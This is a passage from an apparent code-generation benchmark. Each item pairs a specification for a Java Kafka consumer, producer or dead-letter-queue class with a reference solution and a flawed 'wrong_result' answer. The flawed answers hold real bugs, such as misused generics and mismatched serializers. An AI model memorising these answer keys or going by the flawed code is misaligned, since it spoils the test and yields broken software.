    "Instruction": "Task Description: Create a Java class that implements a Kafka consumer thread for reading and processing messages from a Kafka topic, with support for message validation and local store updates.\n\nClass Description: KafkaStoreReaderThread is a thread-based Kafka consumer that reads messages from a specified topic, validates them using a handler, and updates a local store accordingly. It maintains offset tracking and provides shutdown capabilities.\n\nAttributes:\n- topic: String - The Kafka topic to consume messages from\n- topicPartition: TopicPartition - The topic partition being consumed\n- groupId: String - The consumer group ID\n- storeUpdateHandler: StoreUpdateHandler<K, V> - Handler for message validation\n- serializer: Serializer<K, V> - Serializer for message keys and values\n- localStore: Store<K, V> - Local storage for processed messages\n- offsetUpdateLock: ReentrantLock - Lock for thread-safe offset updates\n- offsetReachedThreshold: Condition - Condition for offset tracking\n- consumer: Consumer<byte[], byte[]> - Kafka consumer instance\n- offsetInSchemasTopic: long - Current offset in the topic\n- consumerProps: Properties - Configuration properties for the Kafka consumer\n\nMethods:\n- KafkaStoreReaderThread(String bootstrapBrokers, String topic, String groupId, StoreUpdateHandler<K, V> storeUpdateHandler, Serializer<K, V> serializer, Store<K, V> localStore) -> void - Constructor that initializes the consumer with configuration and dependencies\n- doWork() -> void - Main work method that polls for messages, processes them, and updates the local store\n- shutdown() -> void - Gracefully shuts down the consumer thread",
    "Canonical_solution": "import io.confluent.kafka.schemaregistry.storage.StoreUpdateHandler.ValidationStatus;\nimport io.confluent.kafka.schemaregistry.utils.ShutdownableThread;\nimport org.apache.kafka.clients.consumer.Consumer;\nimport org.apache.kafka.clients.consumer.KafkaConsumer;\nimport org.apache.kafka.clients.consumer.ConsumerRecords;\nimport org.apache.kafka.clients.consumer.ConsumerRecord;\nimport org.apache.kafka.clients.consumer.ConsumerConfig;\nimport org.apache.kafka.common.KafkaException;\nimport org.apache.kafka.common.PartitionInfo;\nimport org.apache.kafka.common.TopicPartition;\nimport org.apache.kafka.common.errors.RecordTooLargeException;\nimport org.apache.kafka.common.errors.WakeupException;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.util.List;\nimport java.util.Properties;\nimport java.util.Arrays;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.locks.Condition;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class KafkaStoreReaderThread<K, V> extends ShutdownableThread {\n\n  private static final Logger log = LoggerFactory.getLogger(KafkaStoreReaderThread.class);\n\n  private final String topic;\n  private final TopicPartition topicPartition;\n  private final String groupId;\n  private final StoreUpdateHandler<K, V> storeUpdateHandler;\n  private final Serializer<K, V> serializer;\n  private final Store<K, V> localStore;\n  private final ReentrantLock offsetUpdateLock;\n  private final Condition offsetReachedThreshold;\n  private Consumer<byte[], byte[]> consumer;\n  private long offsetInSchemasTopic = -1L;\n  private Properties consumerProps = new Properties();\n\n  public KafkaStoreReaderThread(String bootstrapBrokers,\n                              String topic,\n                              String groupId,\n                              StoreUpdateHandler<K, V> storeUpdateHandler,\n                              Serializer<K, V> serializer,\n                              Store<K, V> localStore) {\n    super(\"kafka-store-reader-thread-\" + topic, false);\n    offsetUpdateLock = new ReentrantLock();\n    offsetReachedThreshold = offsetUpdateLock.newCondition();\n    this.topic = topic;\n    this.groupId = groupId;\n    this.storeUpdateHandler = storeUpdateHandler;\n    this.serializer = serializer;\n    this.localStore = localStore;\n\n    consumerProps.put(ConsumerConfig.GROUP_ID_CONFIG, this.groupId);\n    consumerProps.put(ConsumerConfig.CLIENT_ID_CONFIG, \"KafkaStore-reader-\" + this.topic);\n    consumerProps.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapBrokers);\n    consumerProps.put(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG, \"earliest\");\n    consumerProps.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG, \"false\");\n    consumerProps.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG,\n                    org.apache.kafka.common.serialization.ByteArrayDeserializer.class);\n    consumerProps.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG,\n                    org.apache.kafka.common.serialization.ByteArrayDeserializer.class);\n\n    this.consumer = new KafkaConsumer<>(consumerProps);\n    this.topicPartition = new TopicPartition(topic, 0);\n    List<TopicPartition> topicPartitions = Arrays.asList(this.topicPartition);\n    this.consumer.assign(topicPartitions);\n    consumer.seekToBeginning(topicPartitions);\n  }\n\n  @Override\n  public void doWork() {\n    try {\n      ConsumerRecords<byte[], byte[]> records = consumer.poll(Duration.ofMillis(Long.MAX_VALUE));\n      for (ConsumerRecord<byte[], byte[]> record : records) {\n        K messageKey = this.serializer.deserializeKey(record.key());\n        V message = record.value() == null ? null : serializer.deserializeValue(messageKey, record.value());\n        \n        TopicPartition tp = new TopicPartition(record.topic(), record.partition());\n        long offset = record.offset();\n        long timestamp = record.timestamp();\n        ValidationStatus status = this.storeUpdateHandler.validateUpdate(\n                messageKey, message, tp, offset, timestamp);\n        \n        if (status == ValidationStatus.SUCCESS) {\n          if (message == null) {\n            localStore.delete(messageKey);\n          } else {\n            localStore.put(messageKey, message);\n          }\n        }\n\n        try {\n          offsetUpdateLock.lock();\n          offsetInSchemasTopic = record.offset();\n          offsetReachedThreshold.signalAll();\n        } finally {\n          offsetUpdateLock.unlock();\n        }\n      }\n    } catch (WakeupException we) {\n      // Thread is closing\n    } catch (RecordTooLargeException rtle) {\n      throw new IllegalStateException(\"Consumer threw RecordTooLargeException\", rtle);\n    } catch (RuntimeException e) {\n      log.error(\"KafkaStoreReader thread has died\", e);\n      throw e;\n    }\n  }\n\n  @Override\n  public void shutdown() {\n    super.initiateShutdown();\n    if (consumer != null) {\n      consumer.wakeup();\n    }\n    super.awaitShutdown();\n    if (consumer != null) {\n      consumer.close();\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 32,
    "wrong_result": "public class KafkaStoreReaderThread extends Thread {\n    private final String topic;\n    private final String groupId;\n    private final StoreUpdateHandler<K, V> storeUpdateHandler;\n    private final Serializer<K, V> serializer;\n    private final Store<K, V> localStore;\n    private final ReentrantLock offsetUpdateLock;\n    private final Condition offsetReachedThreshold;\n    private final Consumer<byte[], byte[]> consumer;\n    private long offsetInSchemasTopic;\n    private final Properties consumerProps;\n    private final TopicPartition topicPartition;\n\n    public KafkaStoreReaderThread(String bootstrapBrokers, String topic, String groupId, StoreUpdateHandler<K, V> storeUpdateHandler, Serializer<K, V> serializer, Store<K, V> localStore) {\n        this.consumerProps = new Properties();\n        this.consumerProps.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapBrokers);\n        this.consumerProps.put(ConsumerConfig.GROUP_ID_CONFIG, groupId);\n        this.consumerProps.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, \"org.apache.kafka.common.serialization.ByteArrayDeserializer\");\n        this.consumerProps.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, \"org.apache.kafka.common.serialization.ByteArrayDeserializer\");\n        this.consumerProps.put(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG, \"earliest\");\n        this.consumerProps.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG, \"false\");\n\n        this.consumer = new KafkaConsumer<>(consumerProps);\n        this.topic = topic;\n        this.groupId = groupId;\n        this.storeUpdateHandler = storeUpdateHandler;\n        this.serializer = serializer;\n        this.localStore = localStore;\n        this.offsetUpdateLock = new ReentrantLock();\n        this.offsetReachedThreshold = offsetUpdateLock.newCondition();\n        this.topicPartition = new TopicPartition(topic, 0);\n    }\n\n    @Override\n    public void run() {\n        try {\n            consumer.subscribe(Collections.singletonList(topic));\n            while (!isInterrupted()) {\n                ConsumerRecords<byte[], byte[]> records = consumer.poll(Duration.ofMillis(100));\n                for (ConsumerRecord<byte[], byte[]> record : records) {\n                    if (record.partition() == topicPartition.partition()) {\n                        K key = serializer.deserializeKey(record.key(), record.value());\n                        V value = serializer.deserializeValue(record.value());\n                        if (storeUpdateHandler.isValid(key, value)) {\n                            localStore.update(key, value);\n                        }\n                        offsetInSchemasTopic = record.offset();\n                        offsetUpdateLock.lock();\n                        try {\n                            offsetReachedThreshold.signal();\n                        } finally {\n                            offsetUpdateLock.unlock();\n                        }\n                    }\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            consumer.close();\n        }\n    }\n\n    public void shutdown() {\n        interrupt();\n    }\n}"
  },
  {
    "Task_id": 253,
    "Instruction": "Task Description: Create a Kafka consumer class in Java that continuously polls messages from a specified Kafka topic and processes them asynchronously. The class should handle initialization and cleanup properly, and allow for graceful shutdown.\n\nClass Description: KafkaConsumeOrderWorkaround is a Spring component that implements a Kafka consumer worker thread. It consumes messages from a configured Kafka topic, commits offsets asynchronously, and can be gracefully stopped. The consumer runs in a separate thread to avoid blocking the main application.\n\nAttributes:\n- bootstrapServers: String - Kafka broker addresses injected from configuration\n- topicName: String - Kafka topic name to subscribe to, injected from configuration\n- consumerGroup: String - Consumer group ID (default: \"order\")\n- consumer: Consumer<Long, String> - Kafka consumer instance\n- pollingInterval: long - Polling interval in milliseconds (default: 250ms)\n- running: boolean - Flag to control the consumer thread's execution\n- consumerThread: Thread - The thread running the Kafka consumer\n\nMethods:\n- startConsuming() -> void - Initializes and starts the Kafka consumer thread. Configures consumer properties, creates consumer instance, subscribes to topic, and begins polling loop. Annotated with @PostConstruct to run after bean initialization.\n- stopConsuming() -> void - Signals the consumer thread to stop by setting running flag to false. Annotated with @PreDestroy to run before bean destruction.",
    "Canonical_solution": "import java.util.Collections;\nimport java.util.Properties;\nimport javax.annotation.PostConstruct;\nimport javax.annotation.PreDestroy;\nimport org.apache.kafka.clients.consumer.Consumer;\nimport org.apache.kafka.clients.consumer.ConsumerConfig;\nimport org.apache.kafka.clients.consumer.KafkaConsumer;\nimport org.apache.kafka.common.serialization.StringDeserializer;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class KafkaConsumeOrderWorkaround {\n\n    @Value(\"${spring.cloud.stream.kafka.binder.brokers}\")\n    private String bootstrapServers;\n\n    @Value(\"${spring.cloud.stream.bindings.input.destination}\")\n    private String topicName;\n\n    private String consumerGroup = \"order\";\n    private Consumer<Long, String> consumer;\n    private long pollingInterval = 250;\n    private boolean running = true;\n    private Thread consumerThread;\n\n    @PostConstruct\n    public void startConsuming() {\n        consumerThread = new Thread(\"kafka-workaround-consumer\") {\n            public void run() {\n                final Properties props = new Properties();\n                props.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n                props.put(ConsumerConfig.GROUP_ID_CONFIG, consumerGroup);\n                props.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());\n                props.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());\n\n                consumer = new KafkaConsumer<>(props);\n                consumer.subscribe(Collections.singletonList(topicName));\n                while (running) {\n                    consumer.poll(pollingInterval);\n                    consumer.commitAsync();\n                }\n                consumer.close();\n            }\n        };\n        consumerThread.start();\n    }\n\n    @PreDestroy\n    public void stopConsuming() {\n        running = false;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 32,
    "wrong_result": "@Component\npublic class KafkaConsumeOrderWorkaround {\n\n    @Value(\"${kafka.bootstrap.servers}\")\n    private String bootstrapServers;\n\n    @Value(\"${kafka.topic.name}\")\n    private String topicName;\n\n    private String consumerGroup = \"order\";\n\n    private long pollingInterval = 250;\n\n    private boolean running = false;\n\n    private Thread consumerThread;\n\n    private KafkaConsumer<Long, String> consumer;\n\n    @PostConstruct\n    public void startConsuming() {\n        Properties props = new Properties();\n        props.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n        props.put(ConsumerConfig.GROUP_ID_CONFIG, consumerGroup);\n        props.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, LongDeserializer.class.getName());\n        props.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());\n        props.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG, \"false\");\n\n        consumer = new KafkaConsumer<>(props);\n        consumer.subscribe(Collections.singletonList(topicName));\n\n        consumerThread = new Thread(() -> {\n            while (running) {\n                try {\n                    ConsumerRecords<Long, String> records = consumer.poll(Duration.ofMillis(pollingInterval));\n                    for (ConsumerRecord<Long, String> record : records) {\n                        processMessage(record);\n                    }\n                    consumer.commitAsync();\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            }\n        });\n\n        consumerThread.start();\n        running = true;\n    }\n\n    @PreDestroy\n    public void stopConsuming() {\n        running = false;\n        if (consumer != null) {\n            consumer.close();\n        }\n        if (consumerThread != null) {\n            try {\n                consumerThread.join();\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        }\n    }\n\n    private void processMessage(ConsumerRecord<Long, String> record) {\n        System.out.println(\"Received message: \" + record.value());\n    }\n}"
  },
  {
    "Task_id": 254,
    "Instruction": "Task Description: Create a Kafka producer class that handles message serialization and sending to a Kafka topic with configurable properties and error handling.\n\nClass Description: The KafkaStoreProducer class is a generic Kafka producer that serializes and sends key-value pairs to a specified Kafka topic. It provides configurable timeout settings and handles various Kafka-related exceptions.\n\nAttributes:\n- producer: KafkaProducer<byte[], byte[]> - The underlying Kafka producer instance\n- topic: String - The Kafka topic to which messages will be sent\n- serializer: Serializer<K, V> - The serializer for key-value pairs\n- timeout: int - The maximum time to wait for message acknowledgment in milliseconds\n\nMethods:\n- Constructor: KafkaStoreProducer(String bootstrapBrokers, String topic, Serializer<K, V> serializer, int timeout, Properties configProps) -> void - Initializes the Kafka producer with configuration properties including bootstrap servers, topic, serializer, timeout, and additional custom properties\n- put: put(K key, V value) -> V - Serializes and sends a key-value pair to the Kafka topic, returning the value if successful. Throws StoreTimeoutException if the operation times out or StoreException for other errors\n- close: close() -> void - Closes the Kafka producer and releases all resources",
    "Canonical_solution": "import io.confluent.kafka.schemaregistry.storage.exceptions.StoreException;\nimport io.confluent.kafka.schemaregistry.storage.exceptions.StoreTimeoutException;\nimport io.confluent.kafka.schemaregistry.storage.exceptions.SerializationException;\nimport io.confluent.kafka.schemaregistry.storage.serialization.Serializer;\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.clients.producer.RecordMetadata;\nimport org.apache.kafka.common.errors.RecordTooLargeException;\nimport org.apache.kafka.common.serialization.ByteArraySerializer;\nimport java.util.Properties;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.Future;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\n\npublic class KafkaStoreProducer<K, V> {\n\n    private final KafkaProducer<byte[], byte[]> producer;\n    private final String topic;\n    private final Serializer<K, V> serializer;\n    private final int timeout;\n\n    public KafkaStoreProducer(String bootstrapBrokers, String topic, \n                            Serializer<K, V> serializer, int timeout,\n                            Properties configProps) {\n        Properties props = new Properties();\n        props.putAll(configProps);\n        props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapBrokers);\n        props.put(ProducerConfig.ACKS_CONFIG, \"-1\");\n        props.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class);\n        props.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class);\n        props.put(ProducerConfig.ENABLE_IDEMPOTENCE_CONFIG, true);\n\n        this.producer = new KafkaProducer<>(props);\n        this.topic = topic;\n        this.serializer = serializer;\n        this.timeout = timeout;\n    }\n\n    public V put(K key, V value) throws StoreTimeoutException, StoreException {\n        if (key == null) {\n            throw new StoreException(\"Key should not be null\");\n        }\n\n        ProducerRecord<byte[], byte[]> producerRecord;\n        try {\n            producerRecord = new ProducerRecord<>(\n                topic, \n                0, \n                this.serializer.serializeKey(key),\n                value == null ? null : this.serializer.serializeValue(value)\n            );\n        } catch (SerializationException e) {\n            throw new StoreException(\"Error serializing schema while creating the Kafka produce record\", e);\n        }\n\n        try {\n            Future<RecordMetadata> ack = producer.send(producerRecord);\n            RecordMetadata recordMetadata = ack.get(timeout, TimeUnit.MILLISECONDS);\n            return value;\n        } catch (InterruptedException e) {\n            throw new StoreException(\"Put operation interrupted while waiting for an ack from Kafka\", e);\n        } catch (ExecutionException e) {\n            if (e.getCause() instanceof RecordTooLargeException) {\n                throw new StoreException(\"Put operation failed because entry is too large\");\n            } else {\n                throw new StoreException(\"Put operation failed while waiting for an ack from Kafka\", e);\n            }\n        } catch (TimeoutException e) {\n            throw new StoreTimeoutException(\n                \"Put operation timed out while waiting for an ack from Kafka\", e);\n        } catch (KafkaException ke) {\n            throw new StoreException(\"Put operation to Kafka failed\", ke);\n        }\n    }\n\n    public void close() {\n        producer.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "public class KafkaStoreProducer<K, V> {\n    private final KafkaProducer<byte[], byte[]> producer;\n    private final String topic;\n    private final Serializer<K, V> serializer;\n    private final int timeout;\n\n    public KafkaStoreProducer(String bootstrapBrokers, String topic, Serializer<K, V> serializer, int timeout, Properties configProps) {\n        configProps.put(\"bootstrap.servers\", bootstrapBrokers);\n        configProps.put(\"key.serializer\", serializer.getClass().getName());\n        configProps.put(\"value.serializer\", serializer.getClass().getName());\n        configProps.put(\"request.timeout.ms\", String.valueOf(timeout));\n        this.producer = new KafkaProducer<>(configProps);\n        this.topic = topic;\n        this.serializer = serializer;\n    }\n\n    public V put(K key, V value) {\n        try {\n            ProducerRecord<K, V> record = new ProducerRecord<>(topic, key, value);\n            Future<RecordMetadata> future = producer.send(record);\n            future.get(timeout, TimeUnit.MILLISECONDS);\n            return value;\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            throw new StoreException(\"Interrupted during message send: \" + e.getMessage());\n        } catch (ExecutionException e) {\n            if (e.getCause() instanceof TimeoutException) {\n                throw new StoreTimeoutException(\"Timeout while sending message: \" + e.getMessage());\n            } else {\n                throw new StoreException(\"Error sending message: \" + e.getMessage());\n            }\n        } catch (TimeoutException e) {\n            throw new StoreTimeoutException(\"Timeout while sending message: \" + e.getMessage());\n        }\n    }\n\n    public void close() {\n        if (producer != null) {\n            producer.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 255,
    "Instruction": "Task Description: Create a Kafka producer wrapper class in Java that simplifies sending JSON data to Kafka topics.\n\nClass Description: The KafkaProducerWrapper class provides a convenient interface for producing messages to Kafka topics. It handles producer creation, message serialization, and error handling internally.\n\nAttributes:\n- kafkaProducer: Producer<Long, String> - The underlying Kafka producer instance\n- kafkaBrokers: String - Comma-separated list of Kafka broker addresses\n- gson: Gson - JSON serializer/deserializer instance\n\nMethods:\n- createKafkaProducer() -> Producer<Long, String> - Creates and configures a new Kafka producer instance with the specified broker addresses and serializers\n- send2Kafka(JsonElement jsonElement, String topicName) -> void - Serializes the JSON element and sends it to the specified Kafka topic\n- close() -> void - Properly closes the Kafka producer to release resources",
    "Canonical_solution": "import org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.common.serialization.LongSerializer;\nimport org.apache.kafka.common.serialization.StringSerializer;\nimport java.util.Properties;\nimport java.util.concurrent.ExecutionException;\nimport com.google.gson.JsonElement;\nimport com.google.gson.Gson;\n\npublic class KafkaProducerWrapper {\n\n    private Producer<Long, String> kafkaProducer;\n    private String kafkaBrokers;\n    private Gson gson = new Gson();\n\n    public KafkaProducerWrapper(String kafkaBrokers) {\n        this.kafkaBrokers = kafkaBrokers;\n        this.kafkaProducer = createKafkaProducer();\n    }\n\n    public Producer<Long, String> createKafkaProducer() {\n        Properties props = new Properties();\n        props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, kafkaBrokers);\n        props.put(ProducerConfig.CLIENT_ID_CONFIG, Launcher.getInstanceId());\n        props.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, LongSerializer.class.getName());\n        props.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());\n        props.put(ProducerConfig.MAX_BLOCK_MS_CONFIG, 10000);\n        return new KafkaProducer<>(props);\n    }\n\n    public void send2Kafka(JsonElement jsonElement, String topicName) {\n        ProducerRecord<Long, String> record = new ProducerRecord<>(topicName,\n                gson.toJson(jsonElement));\n        try {\n            kafkaProducer.send(record).get();\n        } \n        catch (ExecutionException e) {\n            logger.error(ExceptionUtils.getStackTrace(e));\n        } catch (InterruptedException e) {\n            logger.error(ExceptionUtils.getStackTrace(e));\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    public void close() {\n        if (kafkaProducer != null) {\n            kafkaProducer.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "public class KafkaProducerWrapper {\n    private Producer<Long, String> kafkaProducer;\n    private String kafkaBrokers;\n    private Gson gson;\n\n    public KafkaProducerWrapper(String kafkaBrokers) {\n        this.kafkaBrokers = kafkaBrokers;\n        this.gson = new Gson();\n    }\n\n    public Producer<Long, String> createKafkaProducer() {\n        Properties props = new Properties();\n        props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, kafkaBrokers);\n        props.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, LongSerializer.class.getName());\n        props.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());\n        props.put(ProducerConfig.ACKS_CONFIG, \"all\");\n        props.put(ProducerConfig.RETRIES_CONFIG, 3);\n        kafkaProducer = new KafkaProducer<>(props);\n        return kafkaProducer;\n    }\n\n    public void send2Kafka(JsonElement jsonElement, String topicName) {\n        String json = gson.toJson(jsonElement);\n        ProducerRecord<Long, String> record = new ProducerRecord<>(topicName, 0L, json);\n        kafkaProducer.send(record);\n    }\n\n    public void close() {\n        if (kafkaProducer != null) {\n            kafkaProducer.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 256,
    "Instruction": "Task Description: Implement a Kafka Producer class for handling Dead Letter Queue (DLQ) messages in a rule-based processing system. The class should be able to configure a Kafka producer, convert various message types to bytes, populate message headers with rule context information, and send messages to a DLQ topic.\n\nClass Description: The `DlqAction` class is responsible for sending failed messages to a Dead Letter Queue (DLQ) topic in Kafka. It handles message serialization, header population, and asynchronous message sending with error handling. The class implements a `RuleAction` interface and provides configuration options for the DLQ topic and producer behavior.\n\nAttributes:\n\n- `log`: Logger - Logger instance for logging messages\n- `TYPE`: String - Constant identifying this action type as \"DLQ\"\n- `DLQ_TOPIC`: String - Configuration key for DLQ topic name\n- `DLQ_AUTO_FLUSH`: String - Configuration key for auto-flush setting\n- `PRODUCER`: String - Configuration key for producer instance\n- `HEADER_PREFIX`: String - Prefix for rule-related headers\n- `RULE_NAME`: String - Header key for rule name\n- `RULE_MODE`: String - Header key for rule mode\n- `RULE_SUBJECT`: String - Header key for rule subject\n- `RULE_TOPIC`: String - Header key for original topic\n- `RULE_EXCEPTION`: String - Header key for exception message\n- `configs`: Map<String, ?> - Configuration properties for the producer\n- `topic`: String - DLQ topic name\n- `autoFlush`: boolean - Flag for automatic flushing after send\n- `producer`: KafkaProducer<byte[], byte[]> - Kafka producer instance\n\nMethods:\n\n- `configure(Map<String, ?> configs)`: void - Configures the DLQ action with producer settings and topic name\n- `run(RuleContext ctx, Object message, RuleException ex)`: void - Processes and sends the message to DLQ topic\n- `producer()`: KafkaProducer<byte[], byte[]> - Returns or creates a Kafka producer instance\n- `convertToBytes(RuleContext ctx, Object message)`: byte[] - Converts various message types to byte arrays\n- `convertToJsonBytes(RuleContext ctx, Object message)`: byte[] - Converts objects to JSON byte arrays\n- `populateHeaders(RuleContext ctx, ProducerRecord<byte[], byte[]> producerRecord, RuleException ex)`: void - Adds rule context information to message headers\n- `toBytes(String value)`: byte[] - Helper method to convert strings to UTF-8 bytes\n- `baseProducerConfigs()`: Map<String, Object> - Creates base configuration for Kafka producer\n- `close()`: void - Closes the Kafka producer when no longer needed",
    "Canonical_solution": "import com.fasterxml.jackson.databind.JsonNode;\nimport io.confluent.kafka.schemaregistry.utils.JacksonMapper;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.charset.StandardCharsets;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.UUID;\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.common.errors.SerializationException;\nimport org.apache.kafka.common.header.Headers;\nimport org.apache.kafka.common.serialization.DoubleSerializer;\nimport org.apache.kafka.common.serialization.FloatSerializer;\nimport org.apache.kafka.common.serialization.IntegerSerializer;\nimport org.apache.kafka.common.serialization.LongSerializer;\nimport org.apache.kafka.common.serialization.ShortSerializer;\nimport org.apache.kafka.common.utils.Bytes;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class DlqAction implements RuleAction {\n\n  private static final Logger log = LoggerFactory.getLogger(DlqAction.class);\n\n  public static final String TYPE = \"DLQ\";\n  public static final String DLQ_TOPIC = \"dlq.topic\";\n  public static final String DLQ_AUTO_FLUSH = \"dlq.auto.flush\";\n  public static final String PRODUCER = \"producer\";\n  public static final String HEADER_PREFIX = \"__rule.\";\n  public static final String RULE_NAME = HEADER_PREFIX + \"name\";\n  public static final String RULE_MODE = HEADER_PREFIX + \"mode\";\n  public static final String RULE_SUBJECT = HEADER_PREFIX + \"subject\";\n  public static final String RULE_TOPIC = HEADER_PREFIX + \"topic\";\n  public static final String RULE_EXCEPTION = HEADER_PREFIX + \"exception\";\n\n  private static final LongSerializer LONG_SERIALIZER = new LongSerializer();\n  private static final IntegerSerializer INT_SERIALIZER = new IntegerSerializer();\n  private static final ShortSerializer SHORT_SERIALIZER = new ShortSerializer();\n  private static final DoubleSerializer DOUBLE_SERIALIZER = new DoubleSerializer();\n  private static final FloatSerializer FLOAT_SERIALIZER = new FloatSerializer();\n\n  private Map<String, ?> configs;\n  private String topic;\n  private boolean autoFlush;\n  private volatile KafkaProducer<byte[], byte[]> producer;\n\n  @Override\n  public void configure(Map<String, ?> configs) {\n    this.configs = configs;\n    this.topic = (String) configs.get(DLQ_TOPIC);\n    Object autoFlushConfig = configs.get(DLQ_AUTO_FLUSH);\n    if (autoFlushConfig != null) {\n      this.autoFlush = Boolean.parseBoolean(autoFlushConfig.toString());\n    }\n    this.producer = (KafkaProducer<byte[], byte[]>) configs.get(PRODUCER);\n  }\n\n  public void run(RuleContext ctx, Object message, RuleException ex) throws RuleException {\n    String topic = topic();\n    if (topic == null || topic.isEmpty()) {\n      topic = ctx.getParameter(DLQ_TOPIC);\n    }\n    if (topic == null || topic.isEmpty()) {\n      throw new SerializationException(\"Could not send to DLQ as no topic is configured\");\n    }\n    final String dlqTopic = topic;\n    try {\n      byte[] keyBytes = convertToBytes(ctx, ctx.originalKey());\n      byte[] valueBytes = convertToBytes(ctx, ctx.originalValue());\n      ProducerRecord<byte[], byte[]> producerRecord =\n          new ProducerRecord<>(dlqTopic, null, keyBytes, valueBytes, ctx.headers());\n      populateHeaders(ctx, producerRecord, ex);\n      producer().send(producerRecord, (metadata, exception) -> {\n        if (exception != null) {\n          log.error(\"Could not produce message to DLQ topic {}\", dlqTopic, exception);\n        } else {\n          log.info(\"Sent message to DLQ topic {}\", dlqTopic);\n        }\n      });\n      if (autoFlush) {\n        producer.flush();\n      }\n    } catch (Exception e) {\n      log.error(\"Could not produce message to DLQ topic {}\", dlqTopic, e);\n    }\n    throw ex != null ? new SerializationException(\"Rule failed: \" + ctx.rule().getName(), ex)\n        : new SerializationException(\"Rule failed: \" + ctx.rule().getName());\n  }\n\n  private KafkaProducer<byte[], byte[]> producer() {\n    if (producer == null) {\n      Map<String, Object> producerConfigs = baseProducerConfigs();\n      producerConfigs.putAll(configs);\n      synchronized (this) {\n        if (producer == null) {\n          producer = new KafkaProducer<>(producerConfigs);\n        }\n      }\n    }\n    return producer;\n  }\n\n  private byte[] convertToBytes(RuleContext ctx, Object message) throws IOException {\n    if (message == null) {\n      return null;\n    } else if (message instanceof byte[]) {\n      return (byte[]) message;\n    } else if (message instanceof ByteBuffer) {\n      ByteBuffer buffer = (ByteBuffer) message;\n      byte[] bytes = new byte[buffer.remaining()];\n      buffer.get(bytes);\n      return bytes;\n    } else if (message instanceof Bytes) {\n      return ((Bytes) message).get();\n    } else if (message instanceof String || message instanceof UUID) {\n      return message.toString().getBytes(StandardCharsets.UTF_8);\n    } else if (message instanceof Long) {\n      return LONG_SERIALIZER.serialize(ctx.topic(), (Long)message);\n    } else if (message instanceof Integer) {\n      return INT_SERIALIZER.serialize(ctx.topic(), (Integer) message);\n    } else if (message instanceof Short) {\n      return SHORT_SERIALIZER.serialize(ctx.topic(), (Short) message);\n    } else if (message instanceof Double) {\n      return DOUBLE_SERIALIZER.serialize(ctx.topic(), (Double) message);\n    } else if (message instanceof Float) {\n      return FLOAT_SERIALIZER.serialize(ctx.topic(), (Float) message);\n    } else {\n      return convertToJsonBytes(ctx, message);\n    }\n  }\n\n  private byte[] convertToJsonBytes(RuleContext ctx, Object message) throws IOException {\n    JsonNode json = ctx.target().toJson(message);\n    return JacksonMapper.INSTANCE.writeValueAsBytes(json);\n  }\n\n  private void populateHeaders(\n      RuleContext ctx, ProducerRecord<byte[], byte[]> producerRecord, RuleException ex) {\n    Headers headers = producerRecord.headers();\n    headers.add(RULE_NAME, toBytes(ctx.rule().getName()));\n    